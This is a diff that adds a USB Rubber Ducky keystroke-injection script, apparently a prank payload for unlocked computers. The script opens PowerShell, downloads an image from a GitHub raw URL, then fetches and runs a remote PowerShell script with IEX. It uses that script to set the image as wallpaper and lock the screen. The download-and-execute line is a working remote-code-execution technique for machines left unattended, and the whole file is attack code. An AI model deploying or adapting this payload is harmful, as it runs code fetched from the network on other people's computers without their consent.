@@ -1,0 +1,18 @@
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+STRING (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/phikshun/duckyfiles/master/lock-your-computer.jpg", "$env:USERPROFILE\Downloads\lock.jpg")
+ENTER
+DELAY 2000
+STRING IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/phikshun/duckyfiles/master/wallpaper.ps1")
+ENTER
+DELAY 2000
+STRING Set-Wallpaper "$env:USERPROFILE\Downloads\lock.jpg" Center
+ENTER
+DELAY 100
+STRING exit
+ENTER
+DELAY 100
+GUI l
